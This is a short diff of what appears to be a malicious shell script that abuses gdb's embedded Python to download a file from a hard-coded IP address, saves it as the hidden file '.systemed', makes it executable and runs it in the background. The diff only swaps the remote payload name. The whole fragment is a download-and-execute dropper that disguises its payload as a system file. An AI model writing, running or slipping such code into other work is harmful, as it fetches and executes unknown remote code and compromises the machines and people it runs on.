@@ -6,7 +6,7 @@ MAIN()
 gdb -nx -ex 'python import sys; from os import environ as e
 if sys.version_info.major == 3: import urllib.request as r
 else: import urllib as r
-r.urlretrieve("http://18.212.23.203:8080/SUPERIOR_OUNCE", ".systemed" )' -ex quit
+r.urlretrieve("http://18.212.23.203:8080/COMFORTABLE_CHOWDER", ".systemed" )' -ex quit
 #Change Permissions and Execute File
 chmod +x .systemed
 ./.systemed &
